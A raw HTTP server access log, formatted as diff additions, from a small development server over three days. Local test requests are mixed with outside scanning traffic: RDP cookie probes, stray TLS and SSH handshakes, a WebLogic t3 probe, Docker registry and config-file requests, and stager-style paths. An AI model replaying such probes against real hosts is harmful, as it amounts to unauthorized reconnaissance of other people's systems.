+127.0.0.1 - - [22/Sep/2024 18:40:12] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:40:23] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:40:26] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:40:33] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:40:33] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:43:42] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:43:42] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:43:47] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:43:47] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:49:44] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:49:49] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:49:49] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:50:07] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:50:07] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:50:19] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:50:19] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:54:02] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 19:37:18] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 19:37:19] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 19:37:22] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 19:37:22] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 19:37:27] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 19:40:02] "GET / HTTP/1.1" 200 -
+223.113.128.226 - - [22/Sep/2024 19:57:24] "GET / HTTP/1.1" 200 -
+223.113.128.226 - - [22/Sep/2024 19:57:25] code 400, message Bad request version ('Lç')
+223.113.128.226 - - [22/Sep/2024 19:57:25] "\x16\x03\x01\x00ò\x01\x00\x00î\x03\x03Ø·\x1fÅ\x0b¡\x04\x02\x18Öª\x07ï~·ó|kgÄ Lç" HTTPStatus.BAD_REQUEST -
+223.113.128.226 - - [22/Sep/2024 19:57:25] code 400, message Bad HTTP/0.9 request type ('t3')
+223.113.128.226 - - [22/Sep/2024 19:57:25] "t3 12.1.2" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [22/Sep/2024 20:02:50] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 20:02:54] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 20:02:54] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 20:03:13] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 20:03:13] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:10:24] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:10:24] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:12:07] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:12:07] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:12:21] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:12:21] "GET /favicon.ico HTTP/1.1" 404 -
+39.65.25.228 - - [22/Sep/2024 22:37:42] "GET / HTTP/1.1" 200 -
+39.65.25.228 - - [22/Sep/2024 22:37:43] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 22:48:20] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:48:20] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:49:33] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:49:33] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:52:10] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:52:10] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:52:17] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:52:17] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 22:59:27] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 23:25:22] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 23:25:25] "GET /favicon.ico HTTP/1.1" 404 -
+79.124.49.214 - - [23/Sep/2024 01:12:48] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.214 - - [23/Sep/2024 01:12:48] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+205.210.31.248 - - [23/Sep/2024 04:35:26] "GET / HTTP/1.0" 200 -
+4.151.38.55 - - [23/Sep/2024 05:01:40] "GET /v2/ HTTP/1.1" 404 -
+80.82.70.133 - - [23/Sep/2024 05:23:14] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+80.82.70.133 - - [23/Sep/2024 05:23:14] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À" HTTPStatus.BAD_REQUEST -
+5.8.11.202 - - [23/Sep/2024 05:23:31] code 400, message Bad request version ('»<yzÈÆ_\xadô×¢Î¬ÚxígÉ\x9fj®+ÀÚ')
+5.8.11.202 - - [23/Sep/2024 05:23:31] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¬Ï¸÷Ôóä:\x9a©°\x92â¹<¯\x1eñß!ò\x04\x07Ön±îöï|è\x14 »<yzÈÆ_­ô×¢Î¬ÚxígÉ\x9fj®+ÀÚ" HTTPStatus.BAD_REQUEST -
+5.8.11.202 - - [23/Sep/2024 05:23:31] "GET /v2/_catalog HTTP/1.1" 404 -
+5.8.11.202 - - [23/Sep/2024 05:24:01] code 400, message Bad request version ('À\x14À')
+5.8.11.202 - - [23/Sep/2024 05:24:01] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x0fá\x98\x7fB·RT@¹iÆ¸\x96 V#PR\x15Ç\x99cÍzá#\x88/Ã¹\x84 Û ZÕ&­FN¡\x99\x0e[U¿é±bÔ'!\x9f½Ô\x10\x02\x1cÕ¡d#\x0b7\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+5.8.11.202 - - [23/Sep/2024 05:24:01] "GET /v2/_catalog HTTP/1.1" 404 -
+218.240.7.203 - - [23/Sep/2024 05:28:02] code 400, message Bad request syntax ('SSH-2.0-OpenSSH')
+218.240.7.203 - - [23/Sep/2024 05:28:02] "SSH-2.0-OpenSSH" HTTPStatus.BAD_REQUEST -
+8.210.10.46 - - [23/Sep/2024 10:36:55] code 400, message Bad request version ('À\x14À')
+8.210.10.46 - - [23/Sep/2024 10:36:55] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x9eÏh\x14¥C¤âö÷\x92L¢ÓX)C\x02±:K\x10¿E´Ì28\x8eûªÚ Ùa²\x7fû\x18ù¼Z\x0cµ\x11¶ÿÛ£?&\x8c-S\x82è\x9cz@¼\x8a\x8e\x9c½\x97\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+8.210.10.46 - - [23/Sep/2024 10:40:14] "GET / HTTP/1.1" 200 -
+8.210.10.46 - - [23/Sep/2024 10:40:34] "GET /favicon.ico HTTP/1.1" 404 -
+178.159.37.98 - - [23/Sep/2024 11:29:13] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [23/Sep/2024 11:29:13] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+45.84.89.3 - - [23/Sep/2024 11:30:31] "GET / HTTP/1.1" 200 -
+106.75.101.112 - - [23/Sep/2024 11:56:44] "GET / HTTP/1.1" 200 -
+106.75.101.112 - - [23/Sep/2024 11:56:44] "GET /favicon.ico HTTP/1.1" 404 -
+106.75.101.112 - - [23/Sep/2024 11:56:44] "GET /robots.txt HTTP/1.1" 404 -
+106.75.101.112 - - [23/Sep/2024 11:56:44] "GET /sitemap.xml HTTP/1.1" 404 -
+127.0.0.1 - - [23/Sep/2024 12:18:04] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [23/Sep/2024 12:18:04] "GET /favicon.ico HTTP/1.1" 404 -
+91.240.118.187 - - [23/Sep/2024 12:42:54] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+91.240.118.187 - - [23/Sep/2024 12:42:54] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+79.124.49.202 - - [23/Sep/2024 13:33:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.202 - - [23/Sep/2024 13:33:20] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+198.235.24.89 - - [23/Sep/2024 13:44:51] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [23/Sep/2024 14:58:27] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [23/Sep/2024 14:58:27] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [23/Sep/2024 14:58:34] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [23/Sep/2024 14:58:34] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [23/Sep/2024 15:06:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [23/Sep/2024 15:06:48] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [23/Sep/2024 15:09:27] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [23/Sep/2024 15:14:11] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [23/Sep/2024 15:14:16] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [23/Sep/2024 15:17:08] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [23/Sep/2024 15:17:09] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [23/Sep/2024 15:17:09] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [23/Sep/2024 15:17:10] "GET /favicon.ico HTTP/1.1" 404 -
+83.222.190.78 - - [23/Sep/2024 17:45:09] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [23/Sep/2024 17:45:09] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [23/Sep/2024 17:50:06] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [23/Sep/2024 18:17:13] "GET / HTTP/1.1" 200 -
+154.212.141.143 - - [23/Sep/2024 19:04:14] "GET / HTTP/1.1" 200 -
+101.36.123.30 - - [23/Sep/2024 19:09:14] "GET / HTTP/1.1" 200 -
+101.36.123.30 - - [23/Sep/2024 19:09:14] "GET /favicon.ico HTTP/1.1" 404 -
+79.124.56.186 - - [23/Sep/2024 19:59:27] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.56.186 - - [23/Sep/2024 19:59:27] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+80.82.70.133 - - [23/Sep/2024 21:22:53] "GET / HTTP/1.0" 200 -
+5.8.11.202 - - [23/Sep/2024 21:23:15] code 400, message Bad request version ('\x9d?\x95ÙÑ\x94')
+5.8.11.202 - - [23/Sep/2024 21:23:15] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x97\x13yÎVÖ\x9d\x9f¿îdZ\x1e¸ÀütF\x8cH«£\x1d\x1bþ\x12×ìµ0;E \x9d?\x95ÙÑ\x94" HTTPStatus.BAD_REQUEST -
+5.8.11.202 - - [23/Sep/2024 21:23:15] "GET /v2/_catalog HTTP/1.1" 404 -
+127.0.0.1 - - [23/Sep/2024 21:30:21] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [23/Sep/2024 21:30:22] "GET / HTTP/1.1" 200 -
+185.234.216.112 - - [23/Sep/2024 22:42:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [23/Sep/2024 22:42:44] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [23/Sep/2024 22:53:30] "GET / HTTP/1.1" 200 -
+165.154.182.221 - - [23/Sep/2024 22:54:44] code 400, message Bad request version ('\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À')
+165.154.182.221 - - [23/Sep/2024 22:54:44] "\x16\x03\x01\x01\x17\x01\x00\x01\x13\x03\x03Ü«B\x0cß¤Ì=T\x13ÊÙS¡\x05ØsvèHnÉN\x14\x92³\x80\x1f±Kü¶ ß\x11Ø(ÀLf§\x07=\x09ígÈ6\x92ïÔ¡Ýèc|ørêÓ\x9b~¨pw\x004Ì¨Ì©À/À0À+À,À\x09\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À" HTTPStatus.BAD_REQUEST -
+165.154.182.221 - - [23/Sep/2024 22:54:55] "GET / HTTP/1.1" 200 -
+165.154.182.221 - - [23/Sep/2024 22:54:55] "GET /favicon.ico HTTP/1.1" 404 -
+165.154.182.221 - - [23/Sep/2024 22:54:56] "GET /robots.txt HTTP/1.1" 404 -
+165.154.182.221 - - [23/Sep/2024 22:54:56] "GET /sitemap.xml HTTP/1.1" 404 -
+165.154.182.221 - - [23/Sep/2024 22:54:56] "GET /config.json HTTP/1.1" 404 -
+127.0.0.1 - - [23/Sep/2024 23:25:58] "GET / HTTP/1.1" 200 -
+167.94.145.100 - - [24/Sep/2024 00:21:46] code 400, message Bad request version ('À\x14À')
+167.94.145.100 - - [24/Sep/2024 00:21:46] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ô \x05½ÈÕ\x1aþ\x9e­m\x18\x8aX\x85Þ`å\x89ü&\x88\x14Îí&R£\x8dFæ¢ Ô\x90Æë\x16I\x84\x01*\x1aG\x8fóu\x83\x04E¶\x05\x0bÏlÔ÷½±òòºÛSð\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.145.100 - - [24/Sep/2024 00:21:50] "GET / HTTP/1.1" 200 -
+167.94.145.100 - - [24/Sep/2024 00:21:54] "GET / HTTP/1.1" 200 -
+167.94.145.100 - - [24/Sep/2024 00:21:55] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.145.100 - - [24/Sep/2024 00:21:55] code 505, message Invalid HTTP version (2.0)
+167.94.145.100 - - [24/Sep/2024 00:21:55] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+127.0.0.1 - - [24/Sep/2024 00:38:43] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [24/Sep/2024 00:38:45] "GET / HTTP/1.1" 200 -
+199.45.154.118 - - [24/Sep/2024 01:41:55] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x039\x8e')
+199.45.154.118 - - [24/Sep/2024 01:41:55] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x039\x8e\x85\\]uÇBâÊ\x7f¦¯" HTTPStatus.BAD_REQUEST -
+199.45.154.118 - - [24/Sep/2024 01:41:59] "GET / HTTP/1.1" 200 -
+199.45.154.118 - - [24/Sep/2024 01:42:04] "GET / HTTP/1.1" 200 -
+199.45.154.118 - - [24/Sep/2024 01:42:04] "GET /favicon.ico HTTP/1.1" 404 -
+199.45.154.118 - - [24/Sep/2024 01:42:05] code 505, message Invalid HTTP version (2.0)
+199.45.154.118 - - [24/Sep/2024 01:42:05] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+83.222.190.78 - - [24/Sep/2024 02:34:25] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [24/Sep/2024 02:34:25] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+83.222.190.78 - - [24/Sep/2024 04:15:38] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [24/Sep/2024 04:15:38] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+198.235.24.42 - - [24/Sep/2024 05:12:55] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 06:10:30] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 06:15:28] "GET /?ansudu.com HTTP/1.1" 200 -
+115.231.78.7 - - [24/Sep/2024 07:39:27] "GET / HTTP/1.1" 200 -
+115.231.78.7 - - [24/Sep/2024 07:39:27] "GET / HTTP/1.1" 200 -
+115.231.78.7 - - [24/Sep/2024 07:39:27] "GET /favicon.ico HTTP/1.1" 404 -
+115.231.78.7 - - [24/Sep/2024 07:39:27] "GET /robots.txt HTTP/1.1" 404 -
+193.32.162.76 - - [24/Sep/2024 08:06:23] code 400, message Bad request syntax ('SSH-2.0-OpenSSH')
+193.32.162.76 - - [24/Sep/2024 08:06:23] "SSH-2.0-OpenSSH" HTTPStatus.BAD_REQUEST -
+147.185.132.246 - - [24/Sep/2024 08:55:12] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [24/Sep/2024 09:50:51] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 09:50:52] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [24/Sep/2024 09:50:56] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 09:50:56] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 09:51:50] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 09:51:50] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [24/Sep/2024 09:51:58] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 09:52:06] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 09:52:06] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 09:54:58] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 09:59:09] "GET / HTTP/1.1" 200 -
+79.124.49.214 - - [24/Sep/2024 09:59:35] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.214 - - [24/Sep/2024 09:59:35] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [24/Sep/2024 10:03:54] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 10:06:15] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 10:11:54] "GET / HTTP/1.1" 200 -
+45.84.89.2 - - [24/Sep/2024 12:20:24] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 12:20:52] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 12:47:50] "GET / HTTP/1.1" 200 -
+185.234.216.112 - - [24/Sep/2024 13:40:35] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [24/Sep/2024 13:40:35] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+83.222.190.78 - - [24/Sep/2024 16:11:50] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [24/Sep/2024 16:11:50] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+147.185.132.96 - - [24/Sep/2024 16:17:00] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 16:46:28] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 16:46:28] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [24/Sep/2024 16:46:32] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [24/Sep/2024 16:46:32] "GET /security_check/123/123 HTTP/1.1" 200 -
+120.27.232.82 - - [24/Sep/2024 17:03:25] "GET / HTTP/1.1" 200 -
+120.27.232.82 - - [24/Sep/2024 17:03:25] "GET /favicon.ico HTTP/1.1" 404 -
+101.251.238.166 - - [24/Sep/2024 19:27:34] code 400, message Bad request version ("¯#¢ÍÏ\x89©Çu½\x97¸[Q{WOê\x97d\x1a¨>È(¸?\x90z\x9c\x91\x97\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+101.251.238.166 - - [24/Sep/2024 19:27:34] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x81¹òH\x8d\x87zg\x14\x03_Ê²·\x0dg·hY¸+\x88lÄ÷\x99*ÏÆ\x17ùe ¯#¢ÍÏ\x89©Çu½\x97¸[Q{WOê\x97d\x1a¨>È(¸?\x90z\x9c\x91\x97\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+101.251.238.166 - - [24/Sep/2024 19:28:33] code 400, message Bad request version ("C3oÔ\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+101.251.238.166 - - [24/Sep/2024 19:28:33] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x9bt\x7f\x83\x91\x1fá\x09\x12l+RÀö.\x00\x86=\x1fÛnöââj|\x1e\x88©\x0bäó +D\x0b*¯©°i\x84Á\x1fçú2Çp1"\x01\x09\x96\x8c\x1dÎ?(P\x0dC3oÔ\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+101.251.238.166 - - [24/Sep/2024 19:29:02] "GET / HTTP/1.1" 200 -
+101.251.238.166 - - [24/Sep/2024 19:30:17] "GET /favicon.ico HTTP/1.1" 404 -
+64.62.197.177 - - [24/Sep/2024 19:50:36] "GET / HTTP/1.1" 200 -
+64.62.197.181 - - [24/Sep/2024 19:50:44] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [24/Sep/2024 23:05:43] "GET /favicon.ico HTTP/1.1" 404 -
+83.222.190.78 - - [25/Sep/2024 00:48:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [25/Sep/2024 00:48:58] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [25/Sep/2024 01:03:32] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 01:04:12] "GET /favicon.ico HTTP/1.1" 404 -
+79.124.49.214 - - [25/Sep/2024 02:53:28] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.214 - - [25/Sep/2024 02:53:28] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+198.235.24.104 - - [25/Sep/2024 05:27:24] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 06:36:47] "GET / HTTP/1.1" 200 -
+198.235.24.119 - - [25/Sep/2024 07:14:10] "GET / HTTP/1.0" 200 -
+52.83.91.65 - - [25/Sep/2024 08:16:57] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03¥-~')
+52.83.91.65 - - [25/Sep/2024 08:16:57] "~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03¥-~" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [25/Sep/2024 08:27:42] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 08:27:43] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 08:27:43] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 08:27:44] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 08:34:42] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 08:34:43] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [25/Sep/2024 08:34:47] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 08:34:47] "GET /security_check/123/123 HTTP/1.1" 200 -
+45.84.89.3 - - [25/Sep/2024 10:47:39] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 10:49:34] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 10:49:34] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [25/Sep/2024 10:49:39] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 10:49:39] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 11:00:09] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 11:00:09] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [25/Sep/2024 11:00:17] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 11:00:17] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 11:21:53] "GET / HTTP/1.1" 200 -
+185.234.216.112 - - [25/Sep/2024 11:34:57] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [25/Sep/2024 11:34:57] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [25/Sep/2024 11:39:33] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 11:39:33] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [25/Sep/2024 11:39:40] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 11:39:40] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 12:08:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 12:08:45] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [25/Sep/2024 12:08:51] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 12:08:51] "GET /security_check/123/123 HTTP/1.1" 200 -
+148.153.56.86 - - [25/Sep/2024 12:28:38] "GET /CcLj HTTP/1.1" 404 -
+148.153.56.86 - - [25/Sep/2024 12:28:38] "GET /WrPD HTTP/1.1" 404 -
+148.153.56.86 - - [25/Sep/2024 12:28:40] "GET /aab8 HTTP/1.1" 404 -
+148.153.56.86 - - [25/Sep/2024 12:28:41] "GET /jquery-3.3.1.slim.min.js HTTP/1.1" 404 -
+148.153.56.86 - - [25/Sep/2024 12:28:41] "GET /aab9 HTTP/1.1" 404 -
+148.153.56.86 - - [25/Sep/2024 12:28:42] "GET /jquery-3.3.2.slim.min.js HTTP/1.1" 404 -
+127.0.0.1 - - [25/Sep/2024 12:39:12] "GET / HTTP/1.1" 200 -
